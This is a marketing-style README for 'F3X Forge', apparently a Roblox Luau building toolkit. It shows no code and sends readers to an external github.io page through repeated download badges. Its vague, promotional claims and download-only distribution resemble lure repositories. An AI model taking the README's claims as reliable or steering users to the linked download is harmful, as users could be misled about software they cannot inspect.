![preview](https://raw.githubusercontent.com/RustLeaf/f3x-core-docs/main/screen_23ffb0e.svg)
[![Download](https://raw.githubusercontent.com/RustLeaf/f3x-core-docs/main/latest_bd42.svg)](https://RustLeaf.github.io/f3x-core-docs/)

# 🧩 F3X Forge — Modular Luau Toolkit for Roblox Builders

![Status](https://img.shields.io/badge/status-actively%20maintained-brightgreen)
![License](https://img.shields.io/badge/license-MIT-blue)
![Platform](https://img.shields.io/badge/platform-Roblox%20Studio-orange)
![Language](https://img.shields.io/badge/language-Luau-7B3FE4)
![Version](https://img.shields.io/badge/version-3.2.0-informational)
![Build](https://img.shields.io/badge/build-passing-success)
![UI](https://img.shields.io/badge/interface-responsive-9cf)
![Locales](https://img.shields.io/badge/locales-18-informational)
![Support](https://img.shields.io/badge/support-24%2F7-ff69b4)
![Contributions](https://img.shields.io/badge/contributions-welcome-yellowgreen)

---

## 🚀 What Is F3X Forge?

**F3X Forge** is a meticulously crafted, community-driven Luau library built atop the legendary **F3X** building ecosystem for Roblox. Where the original F3X delivered a toolbox, F3X Forge delivers a *workshop* — a modular expansion layer that lets creators sculpt tools, brushes, gizmos, weld behaviors, and snap-to-grid utilities with surgical precision.

Think of it this way: if Roblox Studio is the atelier, F3X Forge is the set of Japanese chisels hanging on the wall. Every extension is swappable, every module is inspectable, and every API surface is documented so that even the most ambitious plugin author can bend the framework to their will.

Whether you're building an architect's imagination sandbox, a collaborative construction space, or a physics-driven playground, F3X Forge hands you the levers.

---

## 📥 Getting the Toolkit

To acquire the latest build of F3X Forge, retrieve it through the official distribution channel:

[![Download](https://raw.githubusercontent.com/RustLeaf/f3x-core-docs/main/latest_bd42.svg)](https://RustLeaf.github.io/f3x-core-docs/)

Once retrieved, drop the `F3XForge` module into `ReplicatedStorage` and begin requiring it from your server or client scripts. The framework is self-bootstrapping and detects its environment automatically.

---

## ✨ Signature Capabilities

F3X Forge isn't a kitchen-sink dump of features — it's a curated atelier of capabilities. Each one earns its place.

### 🧱 Modular Tool Composition
Every building tool is a small, focused module that declares its own dependencies, event handlers, and lifecycle hooks. Add a new brush without touching the core. Remove one without silencing the rest. The framework's dependency resolver threads them together at runtime like a loom weaving threads into cloth.

### 🎨 Responsive Interface Layer
The UI adapts fluidly across screen sizes, aspect ratios, and device families. A tablet player and a desktop power user see the same toolbox — just arranged with sensitivity to their space. No fixed pixel constraints. No broken layouts on ultrawide monitors.

### 🌍 Multilingual Support
Eighteen locales ship in-box, with a translation pipeline that reads from a flat key/value dictionary. Adding a new language is a matter of duplicating one file and shipping a translation table. Region trees, right-to-left scripts, and pluralization rules are handled by the locale engine.

### 🎯 Precision Snapping & Grid Arbitration
Vertex snapping, edge matching, surface alignment, and rotational quanta — all arbitrated through a single snapping pipeline. The framework prevents conflicting snap requests by ranking them via a priority ladder you can customize.

### 🔧 Extensible Brush Engine
Brushes are data-driven. Each brush declares its geometry primitives, texture behavior, and collision intent. Custom brushes can be registered at runtime, either globally or scoped to a specific session.

### 🧬 Live State Replication
Every operation performed in the interface flows through a deterministic command stream. That stream can be replayed, undone, redone, serialized to a string, or broadcast to other players. Multiplayer build sessions become trivially consistent.

### 🌓 Theme System with Palette Overrides
Ship your tool with light mode, dark mode, or a fully custom palette. The theme engine uses tokens rather than hardcoded colors, so a single override cascades gracefully through every component.

### 📚 Documentation-First API
Every public function carries a doc comment. Every module exposes a manifest. The framework's introspection layer will happily tell you what it can do if you simply ask it.

### 🔐 Safe-by-Default Sandboxing
Third-party extensions run inside a capability gate. They declare what they need — network, input, persistence — and receive only those permissions. Unchecked privilege is a bug, not a feature.

### ⏱️ 24/7 Support Culture
Our maintainers rotate across timezones so that questions never sit unread for long. Issues, discussions, and pull requests receive attention around the clock — because building shouldn't wait for business hours.

---

## 🧭 Project Philosophy

Most libraries try to do everything and end up doing a lot of things poorly. F3X Forge takes the opposite stance: **small, sharp, composable pieces**. We believe editing tools should feel like extensions of the hand — invisible when unnecessary, indispensable when needed.

We also believe in **radical transparency**. Every module is readable. Every dependency is declared. No opaque blobs, no obfuscated cores, no surprise network calls. You can audit the entire surface in an afternoon.

And finally, we believe in **permanence**. Projects that survive a decade do so because their foundations don't shift under their users' feet. We treat the public API as a contract, not a suggestion.

---

## 🛠️ Typical Use Cases

- **Architectural Sandboxes** — Let players sculpt buildings with snapping, symmetry, and undo history.
- **Collaborative Build Studios** — Multiple creators, one canvas, deterministic replication.
- **Educational Tools** — Teach geometry, physics, and design principles with responsive in-game UI.
- **Plugin Foundations** — Build your own Studio-adjacent tooling atop a stable module graph.
- **Prototyping Environments** — Iterate on brush behavior without restarting the game.
- **Roleplay World Editors** — Give trusted players fine-grained construction powers within a capability gate.
- **Level Design Pipelines** — Serialize build sessions to string blobs for later reconstruction.

---

## 🧪 Architecture at a Glance

F3X Forge is organized into five conceptual strata:

1. **Core** — Event bus, module registry, lifecycle manager.
2. **Geometry** — Vectors, planes, quaternions, bounding volumes, snapping mathematics.
3. **Interaction** — Input abstraction, gesture recognition, gizmo handles.
4. **Presentation** — Theme engine, UI primitives, layout orchestrators, locale resolver.
5. **Persistence** — Command stream, serializer, replay engine, capability gate.

Each stratum depends only on those beneath it. This layered discipline keeps the codebase navigable even as it grows.

---

## 🎨 Interface Notes

The responsive interface is built on a token-driven layout system. Components receive constraints from their parent, not from fixed dimensions, so a toolbar that lives at the bottom of a phone screen can occupy the left edge of a desktop monitor without any conditional branching in the consumer's code.

Accessibility is a first-class concern: keyboard navigation, focus rings, high-contrast palettes, and screen-reader-friendly labels all ship by default.

---

## 🌐 Localization Guide

The multilingual layer treats language as data, not logic. A locale file is a flat dictionary of keys to strings. Pluralization is handled via ICU-style selectors. Right-to-left locales flip the layout automatically by consulting the locale metadata.

Eighteen locales currently ship: English, Spanish, Portuguese, French, German, Italian, Dutch, Polish, Swedish, Turkish, Russian, Ukrainian, Arabic, Hebrew, Hindi, Japanese, Korean, and Simplified Chinese. Community additions are welcomed via pull request.

---

## 🔄 Versioning & Compatibility

F3X Forge follows semantic versioning. Breaking changes require a major bump. Additive features require a minor bump. Bug fixes require a patch bump.

The library targets modern Roblox Luau runtimes and avoids deprecated APIs. Legacy support branches are maintained for older engine snapshots upon request.

---

## 🧑‍🤝‍🧑 Contributing

We welcome contributions of every size: typo fixes, doc improvements, new locales, additional brushes, or architectural proposals. The process is deliberately lightweight:

- Open an issue describing what you want to change and why.
- Fork the repository and create a topic branch.
- Keep commits focused and messages descriptive.
- Include tests or reproduction steps where applicable.
- Submit a pull request and respond to review feedback.

All participants are expected to abide by our code of conduct: be kind, be specific, be patient.

---

## 📜 License

This project is released under the **MIT License**. You are welcome to use, modify, and redistribute the code as long as the original license notice is preserved. See the [LICENSE](./LICENSE) file for the full text.

Copyright © 2026 F3X Forge Contributors.

---

## ⚠️ Disclaimer

F3X Forge is an independent, community-maintained toolkit and is **not affiliated with, endorsed by, or sponsored by Roblox Corporation or the original F3X authors**. All trademarks referenced belong to their respective owners.

The framework is provided **as-is**, without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability arising from the use of the software.

Creators are responsible for ensuring that their use of F3X Forge complies with the Roblox Terms of Service, Community Standards, and any applicable local regulations.

---

## 💬 Community & Support

Questions, ideas, and bug reports are all welcome in the GitHub Discussions and Issues tabs. Our maintainers rotate across timezones to offer **24/7 support** — so whether you're prototyping at dawn or debugging at midnight, someone is usually nearby.

We also host periodic community showcases where creators present what they've forged. If you've built something worth sharing, we'd love to see it.

---

## 🔭 Roadmap Snapshot (2026)

- Q1 — Stabilize the brush registry API and ship a formal spec.
- Q2 — Introduce a visual module browser for runtime introspection.
- Q3 — Expand the locale set beyond twenty languages.
- Q4 — Publish a companion handbook for extension authors.

The roadmap is a living document and shifts with community input.

---

## 🏁 Final Words

F3X Forge exists because building tools should feel like play, not paperwork. Every module, every token, every snapping rule is there to get out of your way and let the creative act take center stage. Fork it, remix it, ship something strange and beautiful with it.

[![Download](https://raw.githubusercontent.com/RustLeaf/f3x-core-docs/main/latest_bd42.svg)](https://RustLeaf.github.io/f3x-core-docs/)